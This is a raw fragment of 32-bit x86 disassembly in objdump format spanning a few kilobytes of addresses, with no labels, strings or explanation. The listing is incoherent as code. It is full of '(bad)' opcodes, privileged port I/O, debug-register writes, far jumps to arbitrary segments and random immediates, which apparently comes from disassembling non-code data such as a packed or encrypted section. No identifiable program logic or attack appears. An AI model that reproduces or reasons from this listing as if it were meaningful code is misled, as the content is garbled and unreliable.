  415b88:	sub    DWORD PTR fs:[esi-0x36fc9428],0xffffffd7
  415b90:	imul   edi,ebp,0x974fab0e
  415b96:	ret    
  415b97:	jmp    0x89a958b2
  415b9c:	sbb    eax,0xb867a5c4
  415ba1:	lds    eax,FWORD PTR [edx+ebx*4]
  415ba4:	and    al,0x6
  415ba6:	push   edx
  415ba7:	arpl   WORD PTR [esi],bp
  415ba9:	(bad)  
  415baa:	cld    
  415bab:	gs (bad) 
  415bad:	pop    ss
  415bae:	sub    DWORD PTR [ecx],edi
  415bb0:	test   ah,bh
  415bb2:	inc    edi
  415bb3:	jle    0x415bc1
  415bb5:	jle    0x415ba8
  415bb7:	inc    ecx
  415bb8:	pop    edx
  415bb9:	test   BYTE PTR [esp+ebp*4+0x4bc10f39],ah
  415bc0:	push   ss
  415bc1:	out    0x99,eax
  415bc3:	dec    eax
  415bc4:	sub    ch,dh
  415bc6:	jae    0x415b4e
  415bc8:	sbb    dh,dh
  415bca:	arpl   WORD PTR [ebx+0x5c],sp
  415bcd:	inc    eax
  415bce:	jmp    0xd26e:0x6b479776
  415bd5:	mov    dh,0x5a
  415bd7:	test   DWORD PTR ss:[edx+0x23],esp
  415bdb:	mov    al,0x18
  415bdd:	push   esp
  415bde:	fwait
  415bdf:	and    BYTE PTR [edx-0x2d],bh
  415be2:	inc    esp
  415be3:	test   eax,0x31d95e69
  415be8:	xor    dl,BYTE PTR [edx+eiz*8]
  415beb:	ret    0x76db
  415bee:	jmp    0x8de5081e
  415bf3:	add    edi,DWORD PTR fs:0x2433fe62
  415bfa:	xlat   BYTE PTR ds:[ebx]
  415bfb:	add    bh,cl
  415bfd:	inc    esi
  415bfe:	or     edx,edi
  415c00:	pushf  
  415c01:	pop    esi
  415c02:	fwait
  415c03:	jbe    0x415c46
  415c05:	and    DWORD PTR [ebx+0x20ffb03d],esp
  415c0b:	mov    bh,0x9c
  415c0d:	cs xchg esp,eax
  415c0f:	or     eax,0xca3191a
  415c14:	xor    dl,ch
  415c16:	push   0xbaaadb6b
  415c1b:	xchg   esi,eax
  415c1c:	int    0x6b
  415c1e:	popa   
  415c1f:	imul   eax,DWORD PTR [edi-0x5b],0x372f03a
  415c26:	icebp  
  415c27:	or     DWORD PTR [ecx+0x2c49e017],edx
  415c2d:	mov    eax,ss
  415c2f:	popa   
  415c30:	fs pop ebx
  415c32:	cmp    bl,BYTE PTR [edi]
  415c34:	pop    ss
  415c35:	xor    DWORD PTR [edx],esi
  415c37:	sub    BYTE PTR ds:0x4868c81a,bh
  415c3d:	dec    DWORD PTR [ecx]
  415c3f:	out    0x82,eax
  415c41:	push   ebp
  415c42:	outs   dx,BYTE PTR ds:[esi]
  415c43:	jmp    0x61a0:0x25e3cb6
  415c4a:	sti    
  415c4b:	and    eax,0x65af556f
  415c50:	mov    db4,ebx
  415c53:	fsubr  QWORD PTR [esi+0x79f1195a]
  415c59:	xchg   ebx,eax
  415c5a:	dec    eax
  415c5b:	pop    esp
  415c5c:	aam    0xff
  415c5e:	push   ebx
  415c5f:	js     0x415c09
  415c61:	dec    ecx
  415c62:	push   cs
  415c63:	pusha  
  415c64:	push   ecx
  415c65:	lods   al,BYTE PTR ds:[esi]
  415c66:	cs popf 
  415c68:	nop
  415c69:	stc    
  415c6a:	aaa    
  415c6b:	add    esp,edx
  415c6d:	and    ecx,DWORD PTR [eax]
  415c6f:	mov    cl,ch
  415c71:	call   0x43ad:0xcf9de29d
  415c78:	nop
  415c79:	into   
  415c7a:	jns    0x415c0c
  415c7c:	fstp   TBYTE PTR [edi-0x32d125fa]
  415c82:	add    al,0x32
  415c84:	mov    ebx,0x4b587bc6
  415c89:	pop    ebx
  415c8a:	mov    ch,0x69
  415c8c:	mov    dl,0x99
  415c8e:	vpcmov ymm10,ymm7,ymm3,YMMWORD PTR [edx-0x23e93c70]
  415c98:	pop    ebp
  415c99:	dec    esi
  415c9a:	dec    esp
  415c9b:	mov    cl,0x76
  415c9d:	ss add eax,0x2f47e80f
  415ca3:	xchg   DWORD PTR [esi+0x77],ebx
  415ca6:	sbb    edi,DWORD PTR [eax+0x1b]
  415ca9:	or     al,0x8b
  415cab:	mov    WORD PTR [ebx-0x4c],cs
  415cae:	jg     0x415c65
  415cb0:	mov    bl,0x8c
  415cb2:	jo     0x415d0a
  415cb4:	jg     0x415c73
  415cb6:	xor    ebp,DWORD PTR [esi+0x3259e59d]
  415cbc:	cli    
  415cbd:	lds    ecx,FWORD PTR [ebx]
  415cbf:	jo     0x415c93
  415cc1:	es push ecx
  415cc3:	xor    al,0xd0
  415cc5:	enter  0x368c,0x84
  415cc9:	pop    esi
  415cca:	and    al,0xac
  415ccc:	enter  0x1ac3,0x83
  415cd0:	and    ebx,DWORD PTR [edi-0x1a]
  415cd3:	mov    bh,0xe
  415cd5:	lods   al,BYTE PTR ds:[esi]
  415cd6:	shr    DWORD PTR [esi],cl
  415cd8:	add    edx,DWORD PTR [edi+0x15]
  415cdb:	or     al,0xe3
  415cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cde:	jmp    0x415d2b
  415ce0:	mov    esp,0x153fef78
  415ce5:	aam    0xb
  415ce7:	push   0xffffffae
  415ce9:	and    eax,0xf1ba42d0
  415cee:	cmp    eax,DWORD PTR [edi]
  415cf0:	inc    edi
  415cf1:	mov    al,0xb5
  415cf3:	(bad)  
  415cf4:	nop
  415cf5:	(bad)  
  415cf6:	not    DWORD PTR [ecx]
  415cf8:	hlt    
  415cf9:	xchg   edx,eax
  415cfa:	mov    cl,BYTE PTR [esi-0x73e65030]
  415d00:	bound  ebp,QWORD PTR [edx+ebp*8]
  415d03:	jne    0x415cc0
  415d05:	or     eax,DWORD PTR [ecx+edx*1+0x2e]
  415d09:	adc    bl,BYTE PTR [ecx-0x4c]
  415d0c:	pop    ds
  415d0d:	scas   al,BYTE PTR es:[edi]
  415d0e:	push   edi
  415d0f:	xor    BYTE PTR [ebp+edi*8-0x7257dee4],al
  415d16:	sbb    BYTE PTR [ecx+edi*8+0x7e4c2e91],dl
  415d1d:	es pop edi
  415d1f:	ffreep st(4)
  415d21:	popa   
  415d22:	or     al,0xc7
  415d24:	hlt    
  415d25:	lea    ecx,ds:0xf10f5f35
  415d2b:	jge    0x415cd6
  415d2d:	fcomp  DWORD PTR [esi+0x1fa44134]
  415d33:	addr16 in eax,0x90
  415d36:	mov    bh,0x59
  415d38:	cmp    edi,DWORD PTR [edi+0x196c61ed]
  415d3e:	mov    eax,0xd0bdea3c
  415d43:	dec    ebp
  415d44:	lds    ebx,FWORD PTR [edx+edx*4]
  415d47:	sbb    dl,BYTE PTR [eax+0x53e2fbc8]
  415d4d:	out    dx,al
  415d4e:	add    dh,BYTE PTR [eax+0x29]
  415d51:	js     0x415db8
  415d53:	scas   eax,DWORD PTR es:[edi]
  415d54:	scas   eax,DWORD PTR es:[edi]
  415d55:	xchg   DWORD PTR [ebp+0x3f],eax
  415d58:	sahf   
  415d59:	and    edi,eax
  415d5b:	inc    ebp
  415d5c:	je     0x415d89
  415d5e:	js     0x415d37
  415d60:	test   eax,0x950ed9b1
  415d65:	or     DWORD PTR [edi+0xc084c00],ebx
  415d6b:	scas   eax,DWORD PTR es:[edi]
  415d6c:	push   edi
  415d6d:	and    ebx,DWORD PTR [ebx]
  415d6f:	mov    bh,dl
  415d71:	sbb    eax,esi
  415d73:	test   eax,0x2e458f95
  415d78:	fisttp QWORD PTR [eax-0x18]
  415d7b:	xchg   esp,eax
  415d7c:	sbb    ch,bh
  415d7e:	mov    dl,0xc
  415d80:	jmp    0x415df2
  415d82:	add    al,0x51
  415d84:	(bad)  
  415d85:	pop    ss
  415d86:	inc    ecx
  415d87:	and    ebp,DWORD PTR [ecx+0x437ff0ee]
  415d8d:	das    
  415d8e:	ret    0x7a61
  415d91:	mov    dl,0x4a
  415d93:	mov    dh,0xa8
  415d95:	stos   BYTE PTR es:[edi],al
  415d96:	and    BYTE PTR [eax+edx*8+0x5e],bl
  415d9a:	cmc    
  415d9b:	add    ch,ch
  415d9d:	lods   eax,DWORD PTR ds:[esi]
  415d9e:	mov    fs,ebp
  415da0:	sub    bh,BYTE PTR ds:0xeb26054e
  415da6:	cwde   
  415da7:	dec    ecx
  415da8:	scas   eax,DWORD PTR es:[edi]
  415da9:	rcl    DWORD PTR [edx+0x11fcde86],cl
  415daf:	(bad)  
  415db1:	xor    ecx,DWORD PTR [ebx]
  415db3:	adc    BYTE PTR [eax+edx*2-0x6cc4fabe],bh
  415dba:	fmul   DWORD PTR [esp+eiz*4]
  415dbd:	pusha  
  415dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dbf:	popa   
  415dc0:	iret   
  415dc1:	push   eax
  415dc2:	aad    0x80
  415dc4:	out    dx,eax
  415dc5:	push   eax
  415dc6:	retf   0x5077
  415dc9:	jae    0x415ddf
  415dcb:	xchg   esi,eax
  415dcc:	dec    esi
  415dcd:	repz fst DWORD PTR [edx]
  415dd0:	pop    edi
  415dd1:	(bad)  
  415dd2:	mov    ebp,0x9182b28e
  415dd7:	leave  
  415dd8:	sub    dl,dl
  415dda:	cwde   
  415ddb:	and    bh,BYTE PTR [ecx+0x72]
  415dde:	in     al,dx
  415ddf:	sub    BYTE PTR [esi+0x4eb71715],0x40
  415de6:	cs das 
  415de8:	std    
  415de9:	add    DWORD PTR [ecx],ebx
  415deb:	push   ebp
  415dec:	stc    
  415ded:	sub    BYTE PTR [eax],bl
  415def:	je     0x415d86
  415df1:	sub    DWORD PTR [edx-0x3a],edi
  415df4:	push   esi
  415df5:	and    al,0x7a
  415df7:	adc    eax,0x3d46f45f
  415dfc:	mov    al,ds:0x333a5bca
  415e01:	push   ebx
  415e02:	dec    edx
  415e03:	add    cl,bl
  415e05:	xor    BYTE PTR [ebx+eax*8-0x36b9154d],cl
  415e0c:	je     0x415e33
  415e0e:	cwde   
  415e0f:	inc    ecx
  415e10:	add    edi,DWORD PTR [edx+0x5]
  415e13:	(bad)  
  415e14:	call   0xcba3:0x131c4e82
  415e1b:	push   0xffffffea
  415e1d:	popa   
  415e1e:	add    BYTE PTR [esi],dl
  415e20:	sub    al,0x4c
  415e22:	scas   eax,DWORD PTR es:[edi]
  415e23:	or     eax,0x854d4e31
  415e28:	and    DWORD PTR [eax],esp
  415e2a:	cwde   
  415e2b:	std    
  415e2c:	add    eax,0xf5beb28
  415e31:	or     al,0x3d
  415e33:	into   
  415e34:	push   ecx
  415e35:	xor    BYTE PTR [ebp-0x59],bl
  415e38:	cmp    eax,0x168e3166
  415e3d:	out    dx,al
  415e3e:	xchg   ebp,eax
  415e3f:	mov    ecx,0xb5766c31
  415e44:	fdiv   QWORD PTR [eax]
  415e46:	jge    0x415e9f
  415e48:	and    al,0xcd
  415e4a:	ins    DWORD PTR es:[edi],dx
  415e4b:	mov    bl,BYTE PTR [ecx]
  415e4d:	mov    esp,0x3af68fe2
  415e52:	cmp    esp,DWORD PTR [edi+0x5c]
  415e55:	add    al,0x63
  415e57:	jb     0x415e4e
  415e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5a:	into   
  415e5b:	xchg   ecx,eax
  415e5c:	test   eax,0xdde04f2d
  415e61:	push   ds
  415e62:	mov    esp,0x2b3a162b
  415e67:	or     al,0x3b
  415e69:	and    DWORD PTR [ebp-0x17],ebp
  415e6c:	and    BYTE PTR [ebx-0x411ad43b],dl
  415e72:	add    BYTE PTR [esi-0x1a9166e9],ch
  415e78:	jnp    0x415e46
  415e7a:	je     0x415ee7
  415e7c:	retf   
  415e7d:	fiadd  DWORD PTR [esi+0x65715651]
  415e83:	mov    al,0xdb
  415e85:	or     edi,DWORD PTR [ecx]
  415e87:	ficom  DWORD PTR [edi]
  415e89:	and    al,0x18
  415e8b:	mul    ebp
  415e8d:	into   
  415e8e:	mov    al,ds:0x46945714
  415e93:	clc    
  415e94:	imul   ecx,edx,0x26
  415e97:	iret   
  415e98:	xchg   DWORD PTR [ecx-0x34],edx
  415e9b:	mov    cl,0x77
  415e9d:	(bad)  
  415e9e:	mov    ds:0x79c6d7b8,al
  415ea3:	push   edx
  415ea4:	loop   0x415edc
  415ea6:	outs   dx,DWORD PTR ds:[esi]
  415ea7:	jo     0x415e3a
  415ea9:	retf   0xe1f6
  415eac:	das    
  415ead:	out    dx,eax
  415eae:	lea    ebp,[ecx]
  415eb0:	hlt    
  415eb1:	adc    BYTE PTR es:[edi],cl
  415eb4:	out    dx,eax
  415eb5:	mov    ecx,esi
  415eb7:	test   al,0xbe
  415eb9:	xchg   esi,eax
  415eba:	icebp  
  415ebb:	lock scas eax,DWORD PTR es:[edi]
  415ebd:	and    edi,esp
  415ebf:	das    
  415ec0:	nop
  415ec1:	int    0xe
  415ec3:	mov    ch,0x55
  415ec5:	pop    edx
  415ec6:	pop    ebp
  415ec7:	(bad)  
  415ec8:	lea    ebx,[esi]
  415eca:	sub    BYTE PTR [si],dl
  415ecd:	outs   dx,DWORD PTR ds:[esi]
  415ece:	jae    0x415ecd
  415ed0:	icebp  
  415ed1:	aas    
  415ed2:	pop    esi
  415ed3:	lea    esp,[ecx+0x4cda0a5d]
  415ed9:	xchg   esp,eax
  415eda:	test   bh,bh
  415edc:	mov    ds,ebp
  415ede:	pusha  
  415edf:	or     al,0xbb
  415ee1:	push   bx
  415ee3:	and    BYTE PTR [ecx+ecx*4],bl
  415ee6:	sub    eax,0xc43d61d1
  415eeb:	sub    eax,0xf2f54917
  415ef0:	mov    edx,0xbd28d591
  415ef5:	dec    ebx
  415ef6:	(bad)  
  415ef7:	pop    ecx
  415ef8:	and    al,0xd3
  415efa:	arpl   WORD PTR [esi],cx
  415efc:	enter  0xeb08,0x33
  415f00:	inc    ebp
  415f01:	xchg   ecx,eax
  415f02:	inc    edx
  415f03:	ror    bl,cl
  415f05:	lock xchg ebp,eax
  415f07:	xor    eax,0x42176cd
  415f0c:	ds (bad) 
  415f0e:	clc    
  415f0f:	cmp    DWORD PTR [edi+0x1d019ca4],ecx
  415f15:	xor    al,0x1f
  415f17:	inc    eax
  415f18:	pop    edx
  415f19:	int    0x55
  415f1b:	pop    eax
  415f1c:	call   0x80d191c7
  415f21:	or     al,0x44
  415f23:	je     0x415f5d
  415f25:	dec    ebp
  415f26:	cmp    DWORD PTR [edi],esi
  415f28:	dec    edx
  415f29:	mov    cl,0xf9
  415f2b:	push   esp
  415f2c:	test   bl,0xe7
  415f2f:	push   0xffffffa0
  415f31:	repz mov esi,0x35c0b300
  415f37:	cmp    esp,DWORD PTR [ecx+0x2b]
  415f3a:	int    0x27
  415f3c:	(bad)  
  415f3e:	aaa    
  415f3f:	mov    BYTE PTR [ecx-0x5b],bl
  415f42:	sahf   
  415f43:	cmp    eax,0xde3e1b70
  415f48:	dec    eax
  415f49:	jne    0x415ee8
  415f4b:	fld    QWORD PTR ds:0x97df188d
  415f51:	and    al,0x51
  415f53:	jmp    0xb23:0xfbd36e32
  415f5a:	js     0x415f1a
  415f5c:	mov    DWORD PTR [ebp-0x23],ebx
  415f5f:	cmp    dl,ch
  415f61:	push   ebp
  415f62:	mov    edx,0xe98d79f2
  415f67:	aaa    
  415f68:	in     eax,0x41
  415f6a:	inc    edi
  415f6b:	ror    BYTE PTR [esi-0x4861b225],0x9
  415f72:	xchg   esi,eax
  415f73:	adc    BYTE PTR [edx-0x5cb36c62],ch
  415f79:	add    al,0x5f
  415f7b:	sbb    al,BYTE PTR ds:0xbe2be156
  415f81:	imul   esi,DWORD PTR [edx+ecx*8-0x7ef56bde],0x9fd31fdb
  415f8c:	jl     0x415f52
  415f8e:	popa   
  415f8f:	or     DWORD PTR [ecx-0x4de4f054],esi
  415f95:	fs dec eax
  415f97:	push   ecx
  415f98:	jns    0x415ff5
  415f9a:	mov    edx,0xdbea7d0c
  415f9f:	mov    dl,0x59
  415fa1:	neg    DWORD PTR [ecx]
  415fa3:	and    ecx,DWORD PTR gs:[ecx]
  415fa6:	int3   
  415fa7:	fsubr  DWORD PTR [edi+0x0]
  415faa:	jmp    0xa191d80f
  415faf:	daa    
  415fb0:	aam    0xaa
  415fb2:	arpl   bp,cx
  415fb4:	mov    ebp,0xa5d9e70a
  415fb9:	mov    cl,dl
  415fbb:	(bad)  
  415fbc:	lods   al,BYTE PTR ds:[esi]
  415fbd:	adc    DWORD PTR [edi-0x747b7c8c],edi
  415fc3:	xchg   ebp,eax
  415fc4:	inc    eax
  415fc5:	shr    DWORD PTR [edx+0x79ee630a],cl
  415fcb:	push   0xffffffe3
  415fcd:	aad    0xee
  415fcf:	ss mov cl,0x67
  415fd2:	aas    
  415fd3:	out    dx,eax
  415fd4:	push   ss
  415fd5:	jecxz  0x415fd9
  415fd7:	pop    edx
  415fd8:	dec    ebx
  415fd9:	test   BYTE PTR [ebx-0x6f2bf58a],0x8b
  415fe0:	pop    eax
  415fe1:	push   0xc694dd6d
  415fe6:	mov    ah,0xee
  415fe8:	dec    esp
  415fe9:	adc    DWORD PTR [edx+esi*1+0x5c],ebx
  415fed:	les    esp,FWORD PTR [ebx-0x4b]
  415ff0:	mov    WORD PTR [eax+esi*1],gs
  415ff3:	xlat   BYTE PTR ds:[ebx]
  415ff4:	hlt    
  415ff5:	pop    esp
  415ff6:	sub    al,0xfe
  415ff8:	data16 (bad) 
  415ffb:	jo     0x416028
  415ffd:	inc    esi
  415ffe:	push   es
  415fff:	sbb    edi,esp
  416001:	pop    esp
  416002:	div    DWORD PTR [ecx-0x70]
  416005:	add    BYTE PTR ds:0x1ec2c264,bh
  41600b:	cmp    al,0x72
  41600d:	and    bh,BYTE PTR [edi-0x72]
  416010:	adc    esp,DWORD PTR [eax+ebx*2+0x179d0e9a]
  416017:	jne    0x416063
  416019:	cmp    dh,BYTE PTR [edi+0x6af5475f]
  41601f:	std    
  416020:	arpl   si,bx
  416022:	mov    dh,0xf
  416024:	sub    al,0xe1
  416026:	xchg   esp,eax
  416027:	xor    BYTE PTR [ecx],bl
  416029:	pop    edx
  41602a:	pop    ecx
  41602b:	pop    esi
  41602c:	sbb    ebx,DWORD PTR [edi]
  41602e:	enter  0x89c,0xee
  416032:	mov    esp,eax
  416034:	and    cl,BYTE PTR [edx]
  416036:	fs out dx,eax
  416038:	into   
  416039:	iret   
  41603a:	stos   BYTE PTR es:[edi],al
  41603b:	jno    0x41608e
  41603d:	fld    QWORD PTR [edi+ebp*1]
  416040:	inc    edi
  416041:	push   ebx
  416042:	xor    DWORD PTR [eax],0xeb57f460
  416048:	pop    ss
  416049:	add    BYTE PTR [edx],dl
  41604b:	and    esp,DWORD PTR [ecx]
  41604d:	inc    esi
  41604e:	push   es
  41604f:	int3   
  416050:	jg     0x416074
  416052:	jbe    0x416091
  416054:	lock leave 
  416056:	cmp    ch,BYTE PTR [edi-0x70a80fb]
  41605c:	stos   BYTE PTR es:[edi],al
  41605d:	aaa    
  41605e:	ds inc ebp
  416060:	and    ebx,edi
  416062:	xor    edi,esp
  416064:	sahf   
  416065:	xchg   edx,eax
  416066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416067:	cmp    DWORD PTR [esi-0x7c],edx
  41606a:	sub    bh,ah
  41606c:	mov    esi,0xe301f25
  416071:	and    al,0x4c
  416073:	jg     0x4160b2
  416075:	jg     0x4160b5
  416077:	outs   dx,DWORD PTR ds:[esi]
  416078:	cld    
  416079:	jnp    0x416018
  41607b:	and    BYTE PTR [ebp+0x39],al
  41607e:	arpl   WORD PTR [esp+edi*1],bx
  416081:	jl     0x416037
  416083:	nop
  416084:	add    DWORD PTR [edx-0x3a5253eb],0x78
  41608b:	dec    ebx
  41608c:	dec    ebp
  41608d:	inc    edx
  41608e:	lods   al,BYTE PTR ds:[esi]
  41608f:	xchg   ebx,eax
  416090:	mov    bl,0x1b
  416092:	in     eax,dx
  416093:	ret    0x97a4
  416096:	in     eax,dx
  416097:	jge    0x4160c3
  416099:	ds icebp 
  41609b:	or     esi,ebp
  41609d:	sbb    ch,bl
  41609f:	xchg   edi,eax
  4160a0:	(bad)
  4160a4:	xor    ebx,esi
  4160a6:	push   esp
  4160a7:	test   DWORD PTR [esi],esi
  4160a9:	jg     0x4160f5
  4160ab:	inc    eax
  4160ac:	mov    ch,0xa5
  4160ae:	std    
  4160af:	adc    eax,DWORD PTR [ecx]
  4160b1:	xchg   edx,eax
  4160b2:	dec    ebp
  4160b3:	int3   
  4160b4:	popa   
  4160b5:	in     al,dx
  4160b6:	into   
  4160b7:	fwait
  4160b8:	add    BYTE PTR [eax-0x4d],ch
  4160bb:	inc    esi
  4160bc:	mov    esi,0x15e1971e
  4160c1:	push   ecx
  4160c2:	(bad)  
  4160c4:	push   eax
  4160c5:	loopne 0x4160b6
  4160c7:	aad    0x2f
  4160c9:	out    0x70,eax
  4160cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160cc:	sub    DWORD PTR [edi+0x3698ff68],esi
  4160d2:	jmp    0x501b:0x6610cdae
  4160d9:	mov    ch,0xc7
  4160db:	xlat   BYTE PTR ds:[ebx]
  4160dc:	cdq    
  4160dd:	aaa    
  4160de:	in     al,dx
  4160df:	icebp  
  4160e0:	iret   
  4160e1:	or     al,0xe0
  4160e3:	mov    esi,0x97c1c3a8
  4160e8:	mov    ebx,0xf5061d19
  4160ed:	add    dh,BYTE PTR [ebx+0x7f]
  4160f0:	sub    DWORD PTR [ecx-0x827c8c0],eax
  4160f6:	cmp    eax,0xbae2f943
  4160fb:	popf   
  4160fc:	cs push cs
  4160fe:	int    0x3d
  416100:	shl    ch,1
  416102:	shr    DWORD PTR [ebp+0x139daace],0x92
  416109:	mov    esi,0x18a2c345
  41610e:	jns    0x416161
  416110:	loop   0x4160f7
  416112:	retf   0xd1a1
  416115:	mov    bh,0x2c
  416117:	or     DWORD PTR [ebx+0x1f],ecx
  41611a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41611b:	sub    ah,bl
  41611d:	xor    edi,ecx
  41611f:	pop    ss
  416120:	ret    
  416121:	inc    ebp
  416122:	adc    bl,BYTE PTR [ebx]
  416124:	ss xchg ecx,eax
  416126:	(bad)  
  416127:	cli    
  416128:	arpl   WORD PTR [eax],bp
  41612a:	pop    ds
  41612b:	mov    ecx,0xf5d6eead
  416130:	xchg   ebx,eax
  416131:	jo     0x416119
  416133:	xchg   esp,eax
  416134:	aas    
  416135:	push   ecx
  416136:	push   ds
  416137:	mov    bh,0xd6
  416139:	push   ebx
  41613a:	adc    DWORD PTR [edx-0x43f068b8],0xa36e6ef4
  416144:	pop    edx
  416145:	in     al,0x94
  416147:	cmp    edi,ecx
  416149:	div    BYTE PTR [edx-0x6a]
  41614c:	push   edi
  41614d:	xor    al,0x7f
  41614f:	bound  edx,QWORD PTR [ebx]
  416151:	scas   eax,DWORD PTR es:[edi]
  416152:	xor    bh,BYTE PTR [esi+0x33]
  416155:	idiv   BYTE PTR [edx]
  416157:	mov    ebp,0x4addc463
  41615c:	pop    ebx
  41615d:	mov    ecx,?
  41615f:	shl    DWORD PTR [ebp+0x27],1
  416162:	xor    DWORD PTR [ecx+0x4a],esi
  416165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416166:	jecxz  0x4161e7
  416168:	add    bh,BYTE PTR [eax-0x3ecbc0dd]
  41616e:	leave  
  41616f:	mov    al,0x98
  416171:	cmp    al,0xc5
  416173:	xchg   ecx,eax
  416174:	pop    edi
  416175:	or     eax,0x928e97b1
  41617a:	arpl   WORD PTR [edi-0x6b],di
  41617d:	jno    0x416152
  41617f:	pop    eax
  416180:	cdq    
  416181:	int    0xcd
  416183:	add    DWORD PTR ds:0x8f2b39,0x3f169444
  41618d:	retf   
  41618e:	cmp    bh,al
  416190:	ins    DWORD PTR es:[edi],dx
  416191:	mov    ebx,0xa1b4fdb0
  416196:	mov    esp,0x6dc77b7a
  41619b:	lds    ebx,FWORD PTR [ecx-0x50]
  41619e:	bound  ebp,QWORD PTR [ecx+0x7e82a8f4]
  4161a4:	add    DWORD PTR [edx],0x4c769138
  4161aa:	in     eax,dx
  4161ab:	cmp    al,0x86
  4161ad:	sbb    eax,0xcc0078c2
  4161b2:	test   al,0xb7
  4161b4:	out    0xa8,eax
  4161b6:	loope  0x4161c2
  4161b8:	and    BYTE PTR [ebp+0x12e25438],dl
  4161be:	cld    
  4161bf:	pop    eax
  4161c0:	cli    
  4161c1:	fcomp  DWORD PTR [eax+0x2a2c0a73]
  4161c7:	jecxz  0x416164
  4161c9:	imul   esi,edi,0x1d665e34
  4161cf:	or     al,0xb0
  4161d1:	sar    ah,0x9d
  4161d4:	(bad)  [edx+edi*1+0x19d5e739]
  4161db:	ss pop ds
  4161dd:	jp     0x416197
  4161df:	xor    dl,BYTE PTR [ecx+0x4e39bdf9]
  4161e5:	pop    ebp
  4161e6:	xchg   BYTE PTR [edx-0x10],bl
  4161e9:	mov    edx,0x64044ff4
  4161ee:	dec    esi
  4161ef:	cli    
  4161f0:	fs ins DWORD PTR es:[edi],dx
  4161f2:	mov    al,ds:0x9a0ecbdd
  4161f7:	and    cl,BYTE PTR [ebx-0x53845c65]
  4161fd:	pop    ecx
  4161fe:	sub    DWORD PTR fs:[ebx+0x6419bb46],esp
  416205:	jbe    0x416279
  416207:	xor    DWORD PTR [esi],esp
  416209:	stos   DWORD PTR es:[edi],eax
  41620a:	push   ebp
  41620b:	push   ss
  41620c:	mov    edx,?
  41620e:	retf   0x4764
  416211:	cmp    DWORD PTR [ecx+0x659411ab],esi
  416217:	mov    eax,0xdd6e99c1
  41621c:	ins    DWORD PTR es:[edi],dx
  41621d:	iret   
  41621e:	xor    BYTE PTR [ebp-0x3],0xdf
  416222:	mov    esp,esp
  416224:	and    dh,bh
  416226:	rcr    BYTE PTR [ecx+0x2fab28c8],cl
  41622c:	mov    eax,DWORD PTR [edx-0x69]
  41622f:	ds pop ss
  416231:	rcr    bh,1
  416233:	fisttp QWORD PTR [eax+0x51]
  416236:	icebp  
  416237:	in     al,dx
  416238:	scas   eax,DWORD PTR es:[edi]
  416239:	mov    ds:0x7d21d688,eax
  41623e:	loopne 0x41622e
  416240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416241:	lods   al,BYTE PTR ds:[esi]
  416242:	sbb    bl,ch
  416244:	fwait
  416245:	jmp    DWORD PTR ds:0xae460718
  41624b:	inc    ebx
  41624c:	imul   esp,DWORD PTR [eax+0x76],0x26
  416250:	cmp    ebp,DWORD PTR [edx+0xb]
  416253:	inc    edx
  416254:	xchg   ebx,eax
  416255:	call   0x1078:0x28982d3f
  41625c:	dec    ebp
  41625d:	or     DWORD PTR ds:0xaebf3db4,edx
  416263:	out    dx,al
  416264:	test   DWORD PTR [eax+0x72],edi
  416267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416268:	and    bl,al
  41626a:	pop    ebp
  41626b:	adc    eax,DWORD PTR [eax]
  41626d:	jbe    0x41621f
  41626f:	scas   al,BYTE PTR es:[edi]
  416270:	xchg   edx,eax
  416271:	jns    0x4162eb
  416273:	mov    eax,ds:0x827f41d5
  416278:	or     al,ah
  41627a:	xlat   BYTE PTR ds:[ebx]
  41627b:	(bad)  
  41627c:	fcmovne st,st(4)
  41627e:	stos   BYTE PTR es:[edi],al
  41627f:	xor    DWORD PTR [eax+0x6a82ba7f],eax
  416285:	push   ss
  416286:	lahf   
  416287:	shr    BYTE PTR [esi],1
  416289:	mov    al,0xd8
  41628b:	cmp    esi,edi
  41628d:	fwait
  41628e:	js     0x416229
  416290:	push   ds
  416291:	call   0x30ae:0x79211095
  416298:	add    edx,ebx
  41629a:	adc    DWORD PTR ds:0xe577c721,ecx
  4162a0:	icebp  
  4162a1:	dec    eax
  4162a2:	gs mov bl,0x4
  4162a5:	scas   al,BYTE PTR es:[edi]
  4162a6:	add    eax,0x3e5eff95
  4162ab:	dec    eax
  4162ac:	mov    DWORD PTR [edi+0x7],ecx
  4162af:	mov    al,ds:0x8df3d9d8
  4162b4:	xor    bh,bh
  4162b6:	inc    cl
  4162b8:	push   edx
  4162b9:	arpl   WORD PTR cs:[esi-0x57],sp
  4162bd:	movd   mm3,eax
  4162c0:	adc    bl,bl
  4162c2:	ins    BYTE PTR es:[edi],dx
  4162c3:	lock dec esp
  4162c5:	mov    ecx,0x9b9afca1
  4162ca:	dec    edi
  4162cb:	xor    eax,eax
  4162cd:	jnp    0x416345
  4162cf:	and    al,0x16
  4162d1:	xchg   ecx,eax
  4162d2:	mov    BYTE PTR [esi-0x12204d65],ah
  4162d8:	sub    ah,BYTE PTR ds:0x872842e
  4162de:	pusha  
  4162df:	leave  
  4162e0:	adc    BYTE PTR [edi+eax*1+0x69f3b2db],cl
  4162e7:	outs   dx,DWORD PTR ds:[esi]
  4162e8:	in     eax,dx
  4162e9:	cmp    ebp,DWORD PTR [edi+eiz*8+0x19542118]
  4162f0:	mov    edi,0x73fdf2a3
  4162f5:	fdiv   QWORD PTR [edi+0x52c6420f]
  4162fb:	test   DWORD PTR [ebx+0x3a158d91],esi
  416301:	out    dx,eax
  416302:	jle    0x416346
  416304:	push   cs
  416305:	add    ah,bl
  416307:	jg     0x416334
  416309:	pusha  
  41630a:	mov    ah,0xf4
  41630c:	cwde   
  41630d:	xchg   esp,eax
  41630e:	push   esp
  41630f:	mov    dh,0x3c
  416311:	stc    
  416312:	adc    al,0x44
  416314:	and    DWORD PTR [ebp-0x76],ebp
  416317:	(bad)  
  416318:	fstp   DWORD PTR [edi+0x78]
  41631b:	sub    dh,dl
  41631d:	xor    eax,0x61b75d89
  416322:	cli    
  416323:	xor    BYTE PTR [ecx-0x726eca78],dh
  416329:	daa    
  41632a:	not    DWORD PTR [ebx+0x18]
  41632d:	add    al,0x6b
